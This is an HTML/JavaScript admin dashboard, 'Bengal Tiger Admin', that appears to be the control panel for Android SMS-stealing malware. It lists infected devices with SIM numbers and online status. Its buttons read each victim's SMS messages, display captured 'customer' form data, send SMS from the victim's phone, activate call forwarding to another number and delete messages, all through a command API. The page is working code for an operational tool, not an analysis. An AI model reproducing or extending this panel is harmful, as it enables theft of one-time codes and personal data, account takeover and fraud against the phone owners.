<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bengal Tiger Admin</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --primary: #FFD700; --dark: #111; --success: #28a745; --danger: #dc3545; }
        body { margin: 0; font-family: 'Roboto', sans-serif; background: #f0f2f5; }
        #toast { visibility: hidden; min-width: 250px; background-color: var(--success); color: #fff; text-align: center; border-radius: 5px; padding: 16px; position: fixed; z-index: 3000; right: 30px; top: 30px; font-weight: bold; opacity: 0; transition: 0.5s; }
        #toast.show { visibility: visible; opacity: 1; top: 60px; }
        #toast.error { background-color: var(--danger); }
        #login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--dark); z-index: 2000; display: flex; justify-content: center; align-items: center; flex-direction: column; }
        .login-box { background: white; padding: 40px; border-radius: 8px; text-align: center; width: 300px; }
        .login-box input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; }
        .btn-gold { background: var(--primary); border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; color: var(--dark); }
        header { background: var(--dark); color: var(--primary); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
        .controls i { margin-left: 20px; cursor: pointer; font-size: 20px; color: white; transition: 0.3s; }
        .controls i:hover { color: var(--primary); }
        .stats { display: flex; justify-content: space-around; padding: 20px; margin-top: 20px; }
        .stat-box { background: white; width: 30%; padding: 20px; text-align: center; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border-bottom: 4px solid var(--dark); }
        .stat-num { font-size: 32px; font-weight: bold; color: var(--dark); }
        .filters { text-align: center; margin: 20px; }
        .filter-btn { padding: 10px 20px; margin: 0 5px; background: #ddd; border: none; cursor: pointer; border-radius: 20px; font-weight: bold; }
        .filter-btn.active { background: var(--dark); color: var(--primary); }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; padding: 20px; }
        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); border-top: 5px solid #555; position: relative; }
        .card.online { border-top: 5px solid var(--success); }
        .card.pinned { border-top: 5px solid var(--primary); }
        .status { font-size: 12px; font-weight: bold; color: #666; }
        .info { font-size: 13px; color: #444; margin-bottom: 5px; }
        .btns { display: grid; grid-template-columns: repeat(3,1fr); gap: 8px; margin-top: 15px; }
        .btn-sm { padding: 8px; font-size: 12px; cursor: pointer; border: none; border-radius: 4px; color: white; background: #444; font-weight: bold; }
        .btn-sms { background: var(--success); }
        .btn-call { background: #17a2b8; }
        .btn-view { background: #9c27b0; }
        .btn-del { background: var(--danger); }
        .serial-badge { position: absolute; top: 6px; right: 10px; z-index: 3; background: var(--primary); color: var(--dark); font-weight: bold; padding: 5px 12px; border-radius: 50px; font-size: 14px; }
        .modal { display: none; position: fixed; z-index: 2500; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); }
        .modal.show { display: flex; align-items: center; justify-content: center; }
        .modal-content { background: white; padding: 30px; border-radius: 10px; width: 80%; max-width: 600px; max-height: 80vh; overflow-y: auto; }
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .modal-header h2 { margin: 0; }
        .close-btn { background: var(--danger); color: white; border: none; padding: 8px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; }
        .no-data { text-align: center; color: #999; padding: 30px; }
    </style>
</head>
<body>
    <div id="toast"><i class="fas fa-check-circle"></i> Success</div>
    <div id="login-screen">
        <h1 style="color:var(--primary)">BENGAL TIGER ADMIN</h1>
        <div class="login-box">
            <input type="password" id="pass" placeholder="Enter Password">
            <button class="btn-gold" onclick="login()">LOGIN</button>
        </div>
    </div>

    <div id="dashboard" style="display:none;">
        <header>
            <h2><i class="fas fa-paw"></i> BENGAL TIGER</h2>
            <div class="controls">
                <i class="fas fa-sync-alt" onclick="fetchData(true)" title="Refresh"></i>
                <i class="fas fa-key" onclick="changePass()" title="Change Password"></i>
                <i class="fas fa-sign-out-alt" onclick="location.reload()" title="Logout"></i>
            </div>
        </header>
        <div class="stats">
            <div class="stat-box"><div class="stat-num" id="s-all">0</div>ALL DEVICES</div>
            <div class="stat-box"><div class="stat-num" id="s-on" style="color:var(--success)">0</div>ONLINE</div>
            <div class="stat-box"><div class="stat-num" id="s-pin" style="color:var(--primary)">0</div>PINNED</div>
        </div>
        <div class="filters">
            <button class="filter-btn active" onclick="filter('all', this)">ALL DEVICES</button>
            <button class="filter-btn" onclick="filter('online', this)">ONLINE</button>
            <button class="filter-btn" onclick="filter('pinned', this)">PINNED</button>
        </div>
        <div class="grid" id="grid"></div>
    </div>

    <div id="viewDataModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>📋 Device Data</h2>
                <button class="close-btn" onclick="closeModal('viewDataModal')">✕ Close</button>
            </div>
            <div id="modalBody"></div>
        </div>
    </div>

    <div id="viewSmsModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>📬 SMS Messages</h2>
                <button class="close-btn" onclick="closeModal('viewSmsModal')">✕ Close</button>
            </div>
            <div id="smsModalBody"></div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        function escapeAttr(str) {
            if (str === undefined || str === null) return '';
            return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
        }

        const socket = io();
        let devices = [];
        let currentOpenModal = null;
        let currentFilter = 'all';

        function toast(msg, err=false) {
            const t = document.getElementById("toast");
            t.innerText = msg;
            t.className = err ? "show error" : "show";
            setTimeout(() => t.className = "", 3000);
        }

        async function login() {
            const p = document.getElementById('pass').value;
            try {
                const r = await fetch('/api/login', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ username: 'admin', password: p }) });
                const d = await r.json();
                if (d.success) {
                    document.getElementById('login-screen').style.display='none';
                    document.getElementById('dashboard').style.display='block';
                    fetchData(false);
                } else alert('Wrong Password');
            } catch (err) { toast('Login error', true); }
        }

        async function fetchData(showMsg) {
            try {
                const r = await fetch('/api/devices');
                devices = await r.json();
                render();
                if (currentOpenModal) {
                    if (document.getElementById('viewSmsModal').classList.contains('show') && currentOpenModal.type === 'sms') viewSms(currentOpenModal.deviceId, true);
                    if (document.getElementById('viewDataModal').classList.contains('show')) {
                        if (currentOpenModal.type === 'data') viewData(currentOpenModal.deviceId, true);
                        if (currentOpenModal.type === 'form') viewFormData(currentOpenModal.deviceId, true);
                    }
                }
                if (showMsg) toast('✅ Refresh Successful!');
            } catch (err) { toast('❌ Refresh failed', true); }
        }

        socket.on('dashboard-update', () => fetchData(false));

        function filter(type, btn) {
            currentFilter = type;
            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            render();
        }

        function formatLastSeen(ts) {
            if (!ts) return 'N/A';
            const d = new Date(ts);
            if (isNaN(d.getTime())) return 'N/A';
            const diff = Math.floor((Date.now() - d) / 1000);
            if (diff < 60) return diff + 's ago';
            if (diff < 3600) return Math.floor(diff/60) + 'm ago';
            if (diff < 86400) return Math.floor(diff/3600) + 'h ago';
            return d.toLocaleString();
        }

        function render() {
            document.getElementById('s-all').innerText = devices.length;
            document.getElementById('s-on').innerText = devices.filter(d=>d.isOnline).length;
            document.getElementById('s-pin').innerText = devices.filter(d=>d.isPinned).length;
            const grid = document.getElementById('grid');
            grid.innerHTML = '';
            let list = devices.slice();
            if (currentFilter === 'online') list = list.filter(d=>d.isOnline);
            if (currentFilter === 'pinned') list = list.filter(d=>d.isPinned);
            list.sort((a, b) => new Date(b.registrationTimestamp || 0) - new Date(a.registrationTimestamp || 0));

            list.forEach((d, idx) => {
                const serialNum = idx + 1;
                const batteryIcon = d.battery >= 80 ? 'fa-battery-full' : d.battery >= 50 ? 'fa-battery-half' : 'fa-battery-quarter';
                const statusBadge = `<span style="display:inline-block;border:2px solid #FFD700;border-radius:16px;padding:2px 16px;font-weight:bold;${d.isOnline ? 'color:#43a047;' : 'color:#d32f2f;'}background:#222;font-size:13px;">${d.isOnline ? 'ONLINE' : 'OFFLINE'}</span>`;
                const card = document.createElement('div');
                card.className = `card ${d.isOnline?'online':''} ${d.isPinned?'pinned':''}`;
                card.style = 'border:3px solid #1976d2;box-shadow:0 8px 32px #1976d2a0;position:relative;max-width:320px;margin:auto;border-radius:32px;background:#f8fafc;padding-top:60px;padding-bottom:24px;overflow:hidden;';
                card.innerHTML = `
                    <div style="position:absolute;top:18px;left:18px;"><i class="fas fa-thumbtack" style="color:${d.isPinned?'var(--primary)':'#ccc'};cursor:pointer;font-size:22px;" onclick="togglePin('${d.deviceId}', ${!d.isPinned})"></i></div>
                    <div style="position:absolute;top:12px;right:18px;display:flex;align-items:center;gap:4px;"><i class="fas ${batteryIcon}" style="color:${d.battery>20?'#43a047':'#d32f2f'};font-size:24px;"></i><span style="font-weight:bold;">${d.battery||0}%</span></div>
                    <div class="serial-badge" style="left:50%;transform:translateX(-50%);top:6px;min-width:120px;text-align:center;">#${serialNum} <br> <small>${escapeAttr(d.model||'')}</small></div>
                    <div class="info" style="text-align:center;">${statusBadge}</div>
                    <div class="info"><b>SIM1:</b> ${escapeAttr(d.sim1||'N/A')}</div>
                    <div class="info"><b>SIM2:</b> ${escapeAttr(d.sim2||'N/A')}</div>
                    <div class="info"><b>Last Seen:</b> ${formatLastSeen(d.lastSeen)}</div>
                    <div class="btns">
                        <button class="btn-sm btn-view" style="background:#1976d2;" onclick="viewData('${d.deviceId}')"><i class="fas fa-eye"></i> VIEW DATA</button>
                        <button class="btn-sm btn-view" style="background:#00bcd4;" onclick="viewSms('${d.deviceId}')"><i class="fas fa-envelope"></i> VIEW SMS</button>
                        <button class="btn-sm btn-view" style="background:#ffeb3b;color:#222;" onclick="viewFormData('${d.deviceId}')"><i class="fas fa-file-alt"></i> FORM DATA</button>
                        <button class="btn-sm btn-sms" style="background:#43a047;" onclick="showSendSmsModal('${d.deviceId}')"><i class="fas fa-paper-plane"></i> SEND SMS</button>
                        <button class="btn-sm btn-call" style="background:#ff9800;" onclick="showCallForwardModal('${d.deviceId}')"><i class="fas fa-phone"></i> CALL FWD</button>
                        <button class="btn-sm btn-del" onclick="del('${d.deviceId}')"><i class="fas fa-trash"></i> DELETE</button>
                    </div>`;
                grid.appendChild(card);
            });
        }

        async function togglePin(id, s) {
            await fetch('/api/pin-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({deviceId: id, status: s}) });
            fetchData(false);
        }

        async function del(id) {
            const pass = prompt("Enter Admin Password to Delete:");
            if (!pass) return;
            try {
                const r = await fetch('/api/delete-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, password: pass }) });
                const d = await r.json();
                if (d.success) { toast('Device Deleted'); fetchData(false); }
                else toast(d.message || 'Error', true);
            } catch (e) { toast('Error', true); }
        }

        async function viewData(deviceId, isRefresh = false) {
            currentOpenModal = { type: 'data', deviceId };
            if (!isRefresh) document.getElementById('viewDataModal').classList.add('show');
            try {
                const res = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, action: 'VIEW_DATA' }) });
                const payload = await res.json();
                const device = payload.device || devices.find(d => d.deviceId === deviceId);
                if (!device) return;
                let html = `<div style="background:#e3f2fd;padding:15px;border-radius:8px;"><h3>Device Details</h3>`;
                const fields = [['Model', device.model], ['SIM1', device.sim1], ['SIM2', device.sim2], ['Android', device.androidVersion], ['Battery', device.battery+'%'], ['Last Seen', formatLastSeen(device.lastSeen)]];
                fields.forEach(f => html += `<div style="margin-bottom:5px;"><b>${f[0]}:</b> ${escapeAttr(f[1]||'N/A')}</div>`);
                html += `</div>`;
                document.getElementById('modalBody').innerHTML = html;
            } catch (e) { toast('Error', true); }
        }

        async function viewFormData(deviceId, isRefresh = false) {
            currentOpenModal = { type: 'form', deviceId };
            if (!isRefresh) document.getElementById('viewDataModal').classList.add('show');
            try {
                const res = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, action: 'VIEW_FORM' }) });
                const payload = await res.json();
                const data = payload.customerData || (devices.find(d => d.deviceId === deviceId)||{}).customerData || {};
                let html = `<h3>Form Data</h3>`;
                if (Object.keys(data).length === 0) html += `<div class="no-data">No data found</div>`;
                else Object.entries(data).forEach(([k, v]) => html += `<div style="background:#fffde7;padding:10px;margin-bottom:5px;border-left:4px solid #ff9800;"><b>${escapeAttr(k)}:</b> ${escapeAttr(v)}</div>`);
                document.getElementById('modalBody').innerHTML = html;
            } catch (e) { toast('Error', true); }
        }

        async function viewSms(deviceId, isRefresh = false) {
            currentOpenModal = { type: 'sms', deviceId };
            if (!isRefresh) document.getElementById('viewSmsModal').classList.add('show');
            try {
                const res = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, action: 'VIEW_SMS' }) });
                const payload = await res.json();
                let msgs = payload.messages || (devices.find(d => d.deviceId === deviceId)||{}).smsMessages || [];
                msgs = msgs.slice(0, 50);
                let html = msgs.map(m => `
                    <div style="background:#fff;padding:10px;margin-bottom:8px;border-radius:8px;border-left:5px solid #1976d2;display:flex;justify-content:space-between;align-items:center;">
                        <div style="flex:1;">
                            <div style="color:#1976d2;font-weight:bold;">From: ${escapeAttr(m.from||m.address)}</div>
                            <div style="margin:4px 0;">${escapeAttr(m.body||m.message)}</div>
                            <small style="color:#888;">${formatLastSeen(m.date||m.time)}</small>
                        </div>
                        <div style="display:flex;gap:15px;margin-left:10px;">
                            <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" onclick="navigator.clipboard.writeText('${escapeAttr(m.body||m.message)}');toast('Copied')"></i>
                            <i class="fas fa-trash" style="color:var(--danger);cursor:pointer;" onclick="deleteSms('${deviceId}', '${escapeAttr(m.body||m.message)}', '${m.date||m.time}')"></i>
                        </div>
                    </div>`).join('');
                document.getElementById('smsModalBody').innerHTML = html || '<div class="no-data">No SMS found</div>';
            } catch (e) { toast('Error', true); }
        }

        async function deleteSms(deviceId, body, date) {
            if (!confirm('Delete this SMS?')) return;
            await fetch('/api/delete-sms', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, smsData: { body, date } }) });
            viewSms(deviceId, true);
        }

        function showSendSmsModal(deviceId) {
            const num = prompt("Enter Number:"); if(!num) return;
            const msg = prompt("Enter Message:"); if(!msg) return;
            fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action:'SEND_SMS', data:{ number:num, message:msg, simSlot:1 } }) }).then(r=>r.json()).then(d=>toast(d.message));
        }

        function showCallForwardModal(deviceId) {
            const num = prompt("Enter Forward Number (or leave blank to deactivate):");
            const action = num ? 'CALL_FORWARD_ACTIVATE' : 'CALL_FORWARD_DEACTIVATE';
            fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action, data:{ number:num, simSlot:1 } }) }).then(r=>r.json()).then(d=>toast(d.message));
        }

        function closeModal(id) { document.getElementById(id).classList.remove('show'); currentOpenModal = null; }
        async function changePass() { const o = prompt('Old Password:'); const n = prompt('New Password:'); if (o && n) { const r = await fetch('/api/change-password', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ oldPassword: o, newPassword: n }) }); const d = await r.json(); toast(d.success ? 'Changed' : 'Wrong Old', !d.success); } }
    </script>
</body>
</html>
